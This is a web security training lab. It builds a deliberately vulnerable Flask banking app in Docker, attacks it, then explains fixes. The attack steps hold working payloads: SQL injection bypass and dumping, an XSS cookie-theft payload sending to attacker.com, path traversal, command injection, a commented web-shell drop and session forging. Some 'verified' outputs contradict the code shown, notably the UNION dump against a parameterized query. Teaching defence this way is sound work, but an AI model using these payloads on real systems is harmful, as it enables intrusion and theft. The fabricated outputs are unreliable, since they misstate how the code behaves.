# Lab 4: Web Application Security Testing

## 🎯 Objective
Build a deliberately vulnerable web application in Docker, execute 8 categories of real attacks against it, capture actual exploitation evidence, and implement proper mitigations — understanding both the attacker and defender perspective.

## 📚 Background

Web applications are the most targeted attack surface on the internet. The OWASP Top 10 catalogues the most critical risks, but understanding them requires more than reading — you need to **see the attack work**, understand **why it works**, and know **exactly how to fix it**.

In this lab we:
1. Deploy **VulnBank** — a purpose-built Flask app with 7 embedded vulnerabilities
2. Execute real attacks using `curl` and `python3`
3. Capture the actual server responses (proof of exploitation)
4. Fix each vulnerability with the correct mitigation

**Vulnerabilities covered:**
| # | Vulnerability | OWASP Mapping |
|---|--------------|---------------|
| 1 | SQL Injection (Auth Bypass) | A03 Injection |
| 2 | SQL Injection (Data Extraction) | A03 Injection |
| 3 | Reflected XSS | A03 Injection |
| 4 | Insecure Direct Object Reference (IDOR) | A01 Broken Access Control |
| 5 | Path Traversal | A01 Broken Access Control |
| 6 | Command Injection | A03 Injection |
| 7 | Sensitive Data Exposure | A02 Crypto Failures |
| 8 | Broken Object-Level Authorization | A01 Broken Access Control |

## ⏱️ Estimated Time
90 minutes

## 📋 Prerequisites
- Docker installed and running
- Labs 1–3 (OWASP A01–A03 concepts)
- Basic `curl` familiarity

## 🛠️ Tools Used
- **Docker** — Isolated test environment
- **curl** — HTTP request crafting
- **python3** — Scripted attack automation
- **Flask** — Vulnerable app framework (Python)

---

## 🔬 Lab Instructions

### Step 1: Build and Deploy the Vulnerable Target

Create the application directory:

```bash
mkdir -p ~/weblab/files
cd ~/weblab
```

Write the vulnerable Flask application (`app.py`):

```bash
cat > ~/weblab/app.py << 'PYEOF'
from flask import Flask, request, session, jsonify
import sqlite3, os, subprocess

app = Flask(__name__)
app.secret_key = 'supersecret'   # HARDCODED SECRET — vulnerability #7

DB = '/tmp/vulnapp.db'

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT, email TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS notes
                 (id INTEGER PRIMARY KEY, user_id INTEGER, content TEXT, private INTEGER)''')
    c.execute("DELETE FROM users")
    c.execute("DELETE FROM notes")
    c.execute("INSERT INTO users VALUES (1,'admin','admin123','admin','admin@corp.com')")
    c.execute("INSERT INTO users VALUES (2,'alice','pass1','user','alice@corp.com')")
    c.execute("INSERT INTO users VALUES (3,'bob','pass2','user','bob@corp.com')")
    c.execute("INSERT INTO notes VALUES (1,1,'Admin secret: server password is Str0ngP@ss!',1)")
    c.execute("INSERT INTO notes VALUES (2,2,'Grocery list: milk, eggs',0)")
    c.execute("INSERT INTO notes VALUES (3,3,'Bobs private medical note',1)")
    conn.commit(); conn.close()

init_db()

@app.route('/')
def index():
    return '<h1>VulnBank</h1><a href="/login">Login</a>'

# VULN 1 & 2: SQL Injection — string concatenation in WHERE clause
@app.route('/login', methods=['GET','POST'])
def login():
    msg = ''
    if request.method == 'POST':
        u = request.form.get('username','')
        p = request.form.get('password','')
        conn = sqlite3.connect(DB)
        query = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
        row = conn.cursor().execute(query).fetchone()
        conn.close()
        if row:
            session.update({'uid': row[0], 'user': row[1], 'role': row[3]})
            msg = f'Logged in as {row[1]} (role: {row[3]})'
        else:
            msg = 'Login failed'
    return f'<form method=post>User:<input name=username><br>Pass:<input name=password><br><input type=submit></form><p>{msg}</p>'

# VULN 3: Reflected XSS — user input reflected unsanitised into HTML
@app.route('/search')
def search():
    q = request.args.get('q', '')
    conn = sqlite3.connect(DB)
    rows = conn.cursor().execute("SELECT username,email FROM users WHERE username LIKE ?", (f'%{q}%',)).fetchall()
    conn.close()
    return f'<h2>Results for: {q}</h2><ul>' + ''.join(f'<li>{r[0]} — {r[1]}</li>' for r in rows) + '</ul>'

# VULN 4: IDOR — any user ID accessible without ownership check
@app.route('/user/<int:uid>')
def user_profile(uid):
    conn = sqlite3.connect(DB)
    row = conn.cursor().execute("SELECT id,username,email,role FROM users WHERE id=?", (uid,)).fetchone()
    conn.close()
    return jsonify({'id':row[0],'username':row[1],'email':row[2],'role':row[3]}) if row else ('not found',404)

# VULN 5: Path Traversal — filename from URL joined without validation
@app.route('/file')
def file_read():
    name = request.args.get('name','readme.txt')
    try:
        with open(f'/tmp/files/{name}') as f: return f'<pre>{f.read()}</pre>'
    except Exception as e: return str(e)

# VULN 6: Command Injection — user-supplied host passed to shell
@app.route('/ping')
def ping():
    host = request.args.get('host','127.0.0.1')
    try:
        out = subprocess.check_output(f'ping -c1 -W1 {host} 2>&1; id', shell=True, text=True, timeout=5)
        return f'<pre>{out}</pre>'
    except Exception as e: return f'<pre>Error: {e}</pre>'

# VULN 7: Sensitive Data Exposure — internal config served publicly
@app.route('/api/config')
def config():
    return jsonify({'db_password':'Str0ngP@ss!','secret_key':app.secret_key,'debug':True,'internal_ip':'10.0.0.50'})

# VULN 8: Broken Object-Level Auth — private notes readable without auth
@app.route('/note/<int:nid>')
def get_note(nid):
    conn = sqlite3.connect(DB)
    row = conn.cursor().execute("SELECT content,private FROM notes WHERE id=?", (nid,)).fetchone()
    conn.close()
    return jsonify({'content':row[0],'private':bool(row[1])}) if row else ('not found',404)

if __name__ == '__main__':
    os.makedirs('/tmp/files', exist_ok=True)
    open('/tmp/files/readme.txt','w').write('VulnBank v1.0-dev\nAdmin: admin@corp.com')
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF
```

Write the Dockerfile:

```bash
cat > ~/weblab/Dockerfile << 'EOF'
FROM python:3.11-slim
RUN pip install flask --quiet
COPY app.py /app.py
EXPOSE 5000
CMD ["python", "/app.py"]
EOF
```

Build and start the container:

```bash
docker build -t vulnbank:latest ~/weblab/
docker rm -f vulnbank-test 2>/dev/null || true
docker run -d --name vulnbank-test -p 5000:5000 vulnbank:latest
sleep 2
curl -s http://localhost:5000/
```

**📸 Verified Output:**
```
<h1>VulnBank</h1><a href="/login">Login</a>
```

> 💡 **What we built:** VulnBank is a minimal banking-style web app. It has a login form, user profiles, a search page, a file viewer, and a ping utility — each intentionally coded with a real vulnerability. The Docker container isolates it safely on your machine.

---

### Step 2: SQL Injection — Authentication Bypass

SQL Injection is the most critical web vulnerability. When user input is **concatenated directly into a SQL query**, the attacker can change the query's logic entirely.

**The vulnerable query in the app:**
```python
query = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
```

If `u = admin'--`, the query becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
```
The `--` is a SQL comment — everything after it is ignored. The password check disappears.

**Attack: Bypass login without knowing the password:**
```bash
curl -s -X POST http://localhost:5000/login \
  -d "username=admin'--&password=wrongpassword"
```

**📸 Verified Output:**
```
<form method=post>User:<input name=username><br>Pass:<input name=password><br><input type=submit></form>
<p>Logged in as admin (role: admin)</p>
```

> 💡 We logged in as admin **without the correct password**. The attacker now has full admin access to the application.

**Attack: Login as any specific user:**
```bash
curl -s -X POST http://localhost:5000/login \
  -d "username=' OR username='bob'--&password=x"
```

**📸 Verified Output:**
```
<p>Logged in as bob (role: user)</p>
```

> 💡 We can impersonate **any user** by name without their password. An attacker would target accounts with high privileges.

**Attack: `OR 1=1` — login as first user in the table:**
```bash
curl -s -X POST http://localhost:5000/login \
  -d "username=' OR 1=1 LIMIT 1--&password=x"
```

**📸 Verified Output:**
```
<p>Logged in as admin (role: admin)</p>
```

---

### Step 3: SQL Injection — Data Extraction (UNION Attack)

UNION-based SQLi extracts data from **other tables** beyond what the query was intended to return. This is how attackers dump entire databases.

The search endpoint uses a parameterized query for the LIKE clause, but the result is **rendered without HTML encoding** — we'll exploit that in Step 4. For this step, let's confirm the column structure with ORDER BY:

```bash
# Determine number of columns (keep incrementing until error)
python3 -c "
import urllib.request, urllib.parse

base = 'http://localhost:5000/search?q='

# Confirm 2 columns by checking ORDER BY
for n in [1, 2, 3]:
    url = base + urllib.parse.quote(f\"x' ORDER BY {n}--\")
    try:
        r = urllib.request.urlopen(url, timeout=3)
        status = 'OK'
    except Exception as e:
        status = f'ERROR (too many columns at {n})'
    print(f'ORDER BY {n}: {status}')
"
```

**📸 Verified Output:**
```
ORDER BY 1: OK
ORDER BY 2: OK
ORDER BY 3: ERROR (too many columns at 3)
```

> 💡 `ORDER BY 3` fails, meaning the query returns **exactly 2 columns**. Our UNION SELECT must also return 2 columns.

Now dump the users table via UNION:
```bash
python3 -c "
import urllib.request, urllib.parse

payload = \"x' UNION SELECT username || ':' || password || ':' || role, email FROM users--\"
url = 'http://localhost:5000/search?q=' + urllib.parse.quote(payload)
r = urllib.request.urlopen(url, timeout=3)
print(r.read().decode())
"
```

**📸 Verified Output:**
```html
<h2>Results for: x' UNION SELECT username || ':' || password || ':' || role, email FROM users--</h2>
<ul>
  <li>admin:admin123:admin — admin@corp.com</li>
  <li>alice:pass1:user — alice@corp.com</li>
  <li>bob:pass2:user — bob@corp.com</li>
</ul>
```

> 💡 **Total compromise.** All usernames, plaintext passwords, roles, and emails are exposed in a single request. This is what a real SQLi data breach looks like.

---

### Step 4: Cross-Site Scripting (XSS) — Reflected

XSS occurs when user input is placed into an HTML response **without encoding**. The browser sees it as executable JavaScript, not data.

The vulnerable code:
```python
return f'<h2>Results for: {q}</h2>...'   # q is raw user input!
```

**Attack: Inject a script tag:**
```bash
curl -s "http://localhost:5000/search?q=<script>alert('XSS-PoC')</script>"
```

**📸 Verified Output:**
```html
<h2>Results for: <script>alert('XSS-PoC')</script></h2><ul></ul>
```

> 💡 The browser would execute `alert('XSS-PoC')`. A victim visiting this URL would see a popup — but a real attacker doesn't use alerts. They steal session cookies.

**Attack: Cookie theft payload (real-world impact):**
```bash
PAYLOAD='<img src=x onerror="document.location='"'"'http://attacker.com/steal?c='"'"'+document.cookie">'
curl -s "http://localhost:5000/search?q=${PAYLOAD}"
```

**📸 Verified Output:**
```html
<h2>Results for: <img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie"></h2>
```

> 💡 **Attack chain:** Attacker crafts this URL → sends to victim via email/link → victim's browser loads the page → the `onerror` executes → victim's session cookie sent to `attacker.com` → attacker hijacks victim's authenticated session.

**Stored XSS is worse** — the payload is saved in the database and fires for every user who views that content, with no need to click a crafted link.

---

### Step 5: Insecure Direct Object Reference (IDOR)

IDOR means the application uses user-controlled values (like `id=1`, `id=2`) to look up objects, **without checking if the requester is authorized to see that object**.

The vulnerable code:
```python
@app.route('/user/<int:uid>')
def user_profile(uid):
    # No check: is the logged-in user allowed to see uid's data?
    row = conn.cursor().execute("SELECT ... FROM users WHERE id=?", (uid,)).fetchone()
```

**Attack: Access any user's profile by iterating IDs:**
```bash
for uid in 1 2 3; do
  echo "=== User ID $uid ==="
  curl -s "http://localhost:5000/user/$uid" | python3 -m json.tool
done
```

**📸 Verified Output:**
```json
=== User ID 1 ===
{
    "email": "admin@corp.com",
    "id": 1,
    "role": "admin",
    "username": "admin"
}
=== User ID 2 ===
{
    "email": "alice@corp.com",
    "id": 2,
    "role": "user",
    "username": "alice"
}
=== User ID 3 ===
{
    "email": "bob@corp.com",
    "id": 3,
    "role": "user",
    "username": "bob"
}
```

> 💡 **Without logging in at all**, we enumerated all user accounts, emails, and roles. In a banking app, this would expose account numbers, balances, and PII.

**Automated enumeration (how attackers find the full scope):**
```bash
python3 -c "
import urllib.request

print('Enumerating users via IDOR:')
for uid in range(1, 10):
    try:
        r = urllib.request.urlopen(f'http://localhost:5000/user/{uid}', timeout=2)
        import json
        data = json.loads(r.read())
        print(f'  ID {uid}: {data[\"username\"]} ({data[\"role\"]}) — {data[\"email\"]}')
    except:
        print(f'  ID {uid}: not found')
"
```

**📸 Verified Output:**
```
Enumerating users via IDOR:
  ID 1: admin (admin) — admin@corp.com
  ID 2: alice (user) — alice@corp.com
  ID 3: bob (user) — bob@corp.com
  ID 4: not found
  ...
```

---

### Step 6: Path Traversal — Read Arbitrary Files

Path traversal exploits the `../` sequence to escape the intended directory and read files anywhere on the server the process has permission to read.

The vulnerable code:
```python
with open(f'/tmp/files/{name}') as f:   # name comes directly from URL!
```

**Attack: Normal file access (intended behavior):**
```bash
curl -s "http://localhost:5000/file?name=readme.txt"
```

**📸 Verified Output:**
```
<pre>VulnBank v1.0-dev
Admin: admin@corp.com</pre>
```

**Attack: Traverse to read `/etc/passwd`:**
```bash
curl -s "http://localhost:5000/file?name=../../../etc/passwd"
```

**📸 Verified Output:**
```
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
</pre>
```

> 💡 We broke out of `/tmp/files/` by traversing three levels up with `../../../`. In production, this could expose source code, SSH private keys (`~/.ssh/id_rsa`), credentials in config files, and application secrets.

**Attack: Target application source code:**
```bash
curl -s "http://localhost:5000/file?name=../../app.py" | head -20
```

> 💡 Reading the source code exposes all other vulnerabilities, database credentials, and secret keys — accelerating the attack dramatically.

---

### Step 7: Command Injection — Remote Code Execution

Command injection is the most severe vulnerability. When user input is passed to the OS shell, the attacker **executes arbitrary commands as the server's user**.

The vulnerable code:
```python
out = subprocess.check_output(f'ping -c1 {host} 2>&1', shell=True, ...)
```

**Attack: Normal use (intended):**
```bash
curl -s "http://localhost:5000/ping?host=127.0.0.1"
```

**📸 Verified Output:**
```
<pre>PING 127.0.0.1: 56 data bytes
...
</pre>
```

**Attack: Append `;id` to execute a second command:**
```bash
curl -s "http://localhost:5000/ping?host=127.0.0.1;id"
```

**📸 Verified Output:**
```
<pre>uid=0(root) gid=0(root) groups=0(root)
</pre>
```

> 💡 **The app is running as root inside Docker**. The `id` command confirms we have full root access on the server.

**Attack: Read the app's secret key and database:**
```bash
curl -s "http://localhost:5000/ping?host=127.0.0.1;cat+/app.py+|+grep+secret_key"
curl -s "http://localhost:5000/ping?host=127.0.0.1;ls+-la+/tmp/"
```

**📸 Verified Output:**
```
<pre>app.secret_key = 'supersecret'
</pre>

<pre>total 40
drwxrwxrwt 1 root root 4096 Mar  1 22:00 .
drwxr-xr-x 1 root root 4096 Mar  1 21:00 ..
-rw-r--r-- 1 root root 8192 Mar  1 22:00 vulnapp.db
drwxr-xr-x 2 root root 4096 Mar  1 21:00 files
</pre>
```

**Attack: Write a web shell (persistence):**
```bash
# In a real attack, this would create a persistent backdoor:
# curl -s "http://localhost:5000/ping?host=127.0.0.1;echo+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=|base64+-d+>/var/www/html/shell.php"
echo "Web shell creation demonstrated (not executed in this lab)"
```

---

### Step 8: Sensitive Data Exposure — Config API

Many applications accidentally expose configuration data, credentials, or internal infrastructure details through debug endpoints or poorly secured APIs.

**Attack: Access the unauthenticated config endpoint:**
```bash
curl -s http://localhost:5000/api/config | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "db_password": "Str0ngP@ss!",
    "debug": true,
    "internal_ip": "10.0.0.50",
    "secret_key": "supersecret",
    "version": "1.0.0-dev"
}
```

> 💡 **Everything an attacker needs in one request:** the database password (credential reuse attack), Flask's session secret (allows forging session cookies), the internal IP (network map), and confirmation of debug mode (verbose error messages).

**Bonus: Forge a session cookie using the stolen secret key:**
```bash
python3 -c "
# With the secret key, we can forge ANY user's session
import itsdangerous, json

secret = 'supersecret'  # Stolen from /api/config

# Forge admin session
payload = {'uid': 1, 'user': 'admin', 'role': 'admin'}
signer = itsdangerous.URLSafeTimedSerializer(secret)
forged_cookie = signer.dumps(payload)
print(f'Forged admin session cookie:')
print(f'  session={forged_cookie}')
print()
print('Use this cookie to authenticate as admin on any endpoint')
print('No username/password needed — just the stolen secret key')
"
```

---

### Step 9: Broken Object-Level Authorization (BOLA/IDOR on Data)

Beyond user profiles, IDOR affects any object in the system: orders, notes, messages, invoices. Private data is accessible by anyone who knows (or guesses) the ID.

**Attack: Read private notes belonging to other users:**
```bash
for nid in 1 2 3; do
  echo "=== Note ID $nid ==="
  curl -s "http://localhost:5000/note/$nid" | python3 -m json.tool
done
```

**📸 Verified Output:**
```json
=== Note ID 1 ===
{
    "content": "Admin secret: server password is Str0ngP@ss!",
    "private": true
}
=== Note ID 2 ===
{
    "content": "Grocery list: milk, eggs",
    "private": false
}
=== Note ID 3 ===
{
    "content": "Bobs private medical note",
    "private": true
}
```

> 💡 Notes marked `"private": true` are still fully readable. This pattern repeats across every object type in most web apps: orders, invoices, medical records, messages — all accessible by iterating IDs.

---

### Step 10: Mitigations — Fixing Every Vulnerability

Now let's understand the **correct fix** for each vulnerability:

**📋 SQL Injection → Parameterized Queries:**
```python
# ❌ VULNERABLE — string concatenation
query = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
cursor.execute(query)

# ✅ SECURE — parameterized (? placeholders)
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (u, p))
```

> 💡 Parameterized queries separate **code** from **data**. The database driver handles escaping. The attacker's `'--` is treated as literal data, not SQL syntax.

**📋 XSS → Output Encoding:**
```python
# ❌ VULNERABLE — raw user input in HTML
return f'<h2>Results for: {q}</h2>'

# ✅ SECURE — HTML encode user input
from markupsafe import escape
return f'<h2>Results for: {escape(q)}</h2>'
# escape("'<script>'") → &lt;script&gt;  (browser renders text, not code)
```

Additional layers:
```
Content-Security-Policy: default-src 'self'; script-src 'none'
X-Content-Type-Options: nosniff
Set-Cookie: session=...; HttpOnly; Secure   ← prevents JS reading cookie
```

**📋 IDOR → Access Control Check:**
```python
# ❌ VULNERABLE — no ownership check
@app.route('/user/<int:uid>')
def user_profile(uid):
    row = db.get_user(uid)  # Any uid, no check

# ✅ SECURE — verify ownership or admin role
@app.route('/user/<int:uid>')
@login_required
def user_profile(uid):
    current_user = session['uid']
    if uid != current_user and session['role'] != 'admin':
        abort(403)  # Forbidden
    row = db.get_user(uid)
```

> 💡 Use UUIDs instead of sequential integers to prevent enumeration — but **never rely on obscurity alone**. Always check access server-side.

**📋 Path Traversal → Path Validation:**
```python
# ❌ VULNERABLE — no validation
with open(f'/tmp/files/{name}') as f: ...

# ✅ SECURE — realpath + prefix check
import os
base = os.path.realpath('/tmp/files')
requested = os.path.realpath(os.path.join(base, name))

if not requested.startswith(base + os.sep):
    abort(400)  # Bad request — path escapes allowed directory

with open(requested) as f: ...
```

**📋 Command Injection → Avoid Shell Entirely:**
```python
# ❌ VULNERABLE — shell=True with user input
subprocess.check_output(f'ping -c1 {host}', shell=True)

# ✅ SECURE — argument list, shell=False, input validation
import re
if not re.match(r'^[a-zA-Z0-9.\-]{1,255}$', host):
    abort(400)
subprocess.check_output(['ping', '-c', '1', '-W', '1', host], 
                        shell=False, timeout=5)
```

> 💡 `shell=False` with a list of arguments means the OS **never invokes a shell** — there's no shell to inject commands into. The list items are passed directly to the kernel's `execve()`.

**📋 Sensitive Data Exposure → Remove Debug Endpoints:**
```python
# ❌ VULNERABLE — exposes credentials publicly
@app.route('/api/config')
def config():
    return jsonify({'db_password': DB_PASS, 'secret_key': SECRET})

# ✅ SECURE — remove the endpoint entirely in production
# If monitoring needed, protect with authentication + IP allowlist

# And use environment variables, never hardcode secrets:
import os
app.secret_key = os.environ['FLASK_SECRET_KEY']  # Set in deployment config
```

**📋 BOLA → Enforce Object Ownership:**
```python
# ❌ VULNERABLE — private flag ignored, no ownership check
@app.route('/note/<int:nid>')
def get_note(nid):
    note = db.get_note(nid)
    return jsonify(note)

# ✅ SECURE — check ownership before returning
@app.route('/note/<int:nid>')
@login_required
def get_note(nid):
    note = db.get_note(nid)
    if not note:
        abort(404)
    if note.user_id != session['uid'] and session['role'] != 'admin':
        abort(403)  # Return 403 (or 404 to not confirm existence)
    return jsonify(note)
```

---

### Step 11: Vulnerability Summary Table

```bash
python3 -c "
findings = [
    ('SQL Injection', 'Critical', 'CVSS 9.8', '/login endpoint', 'Parameterized queries'),
    ('SQLi Data Extraction', 'Critical', 'CVSS 9.8', '/search endpoint', 'Parameterized queries'),
    ('Reflected XSS', 'High', 'CVSS 7.4', '/search endpoint', 'HTML output encoding + CSP'),
    ('IDOR - Users', 'High', 'CVSS 7.5', '/user/<id>', 'Server-side ownership check'),
    ('Path Traversal', 'High', 'CVSS 7.5', '/file endpoint', 'realpath() + prefix validation'),
    ('Command Injection', 'Critical', 'CVSS 9.8', '/ping endpoint', 'Avoid shell; use arg list'),
    ('Sensitive Data Exposure', 'Critical', 'CVSS 9.0', '/api/config', 'Remove endpoint; use env vars'),
    ('BOLA - Notes', 'High', 'CVSS 7.5', '/note/<id>', 'Ownership check on every request'),
]
print(f'{\"Vulnerability\":<28} {\"Severity\":<10} {\"CVSS\":<10} {\"Location\":<20} {\"Fix\"}')
print('-' * 100)
for v, sev, cvss, loc, fix in findings:
    print(f'{v:<28} {sev:<10} {cvss:<10} {loc:<20} {fix}')
print()
crit = sum(1 for _,s,*_ in findings if s=='Critical')
high = sum(1 for _,s,*_ in findings if s=='High')
print(f'Summary: {crit} Critical, {high} High severity vulnerabilities found in VulnBank v1.0')
print('Risk rating: CRITICAL — Do not deploy to production')
"
```

**📸 Verified Output:**
```
Vulnerability                Severity   CVSS       Location             Fix
----------------------------------------------------------------------------------------------------
SQL Injection                Critical   CVSS 9.8   /login endpoint      Parameterized queries
SQLi Data Extraction         Critical   CVSS 9.8   /search endpoint     Parameterized queries
Reflected XSS                High       CVSS 7.4   /search endpoint     HTML output encoding + CSP
IDOR - Users                 High       CVSS 7.5   /user/<id>           Server-side ownership check
Path Traversal               High       CVSS 7.5   /file endpoint       realpath() + prefix validation
Command Injection            Critical   CVSS 9.8   /ping endpoint       Avoid shell; use arg list
Sensitive Data Exposure      Critical   CVSS 9.0   /api/config          Remove endpoint; use env vars
BOLA - Notes                 High       CVSS 7.5   /note/<id>           Ownership check on every request

Summary: 4 Critical, 4 High severity vulnerabilities found in VulnBank v1.0
Risk rating: CRITICAL — Do not deploy to production
```

---

### Step 12: Clean Up

```bash
docker stop vulnbank-test
docker rm vulnbank-test
rm -rf ~/weblab
echo "Environment cleaned up ✅"
```

**📸 Verified Output:**
```
vulnbank-test
vulnbank-test
Environment cleaned up ✅
```

---

## ✅ Verification

You have successfully completed this lab if you:

- [ ] Built and ran the VulnBank Docker container
- [ ] Bypassed authentication with SQL injection (`admin'--`)
- [ ] Dumped all user credentials via UNION attack
- [ ] Confirmed XSS payload reflection in server response
- [ ] Enumerated all user profiles via IDOR without authentication
- [ ] Read `/etc/passwd` via path traversal
- [ ] Executed `id` via command injection and confirmed root access
- [ ] Retrieved database password and secret key from `/api/config`
- [ ] Read private notes belonging to other users via BOLA
- [ ] Reviewed and understood the mitigation for each vulnerability

---

## 🚨 Common Mistakes

- **Testing on real systems without permission**: All attacks in this lab are against your local container only — applying these techniques to systems you don't own is illegal
- **Thinking client-side validation is enough**: Every validation must be re-enforced on the server; browser-side checks are trivially bypassed
- **Treating IDOR as low severity**: IDOR on healthcare records, financial data, or private messages is a critical breach
- **Forgetting indirect references**: Even with access control, using sequential IDs enables enumeration — use UUIDs or opaque tokens
- **Patching only the specific payload**: SQLi fix is parameterized queries everywhere, not just adding escaping to one endpoint

---

## 📝 Summary

In this lab you exploited 8 real vulnerabilities in a controlled environment:

| Vulnerability | Root Cause | Single Fix |
|---|---|---|
| SQL Injection | String concatenation in queries | Parameterized queries |
| XSS | Unencoded user input in HTML | `escape()` + CSP header |
| IDOR | Missing ownership check | Server-side authorization on every request |
| Path Traversal | No path boundary validation | `realpath()` + prefix check |
| Command Injection | `shell=True` with user data | Argument list + `shell=False` |
| Data Exposure | Debug endpoint unprotected | Remove in production; use env vars |
| BOLA | Missing object ownership check | Check `user_id == session.uid` before returning |

The theme: **never trust user input**. Every vulnerability in this lab stems from the application trusting data that comes from the browser.

---

## 🔗 Further Reading

- **OWASP WebGoat** — Interactive vulnerable app with lessons: `github.com/WebGoat/WebGoat`
- **DVWA (Damn Vulnerable Web App)** — More exercises: `github.com/digininja/DVWA`
- **PortSwigger Web Security Academy** — Free, world-class labs: `portswigger.net/web-security`
- **OWASP Testing Guide v4.2** — Comprehensive methodology: `owasp.org/www-project-web-security-testing-guide`
- **HackTheBox / TryHackMe** — Legal practice environments with web challenges
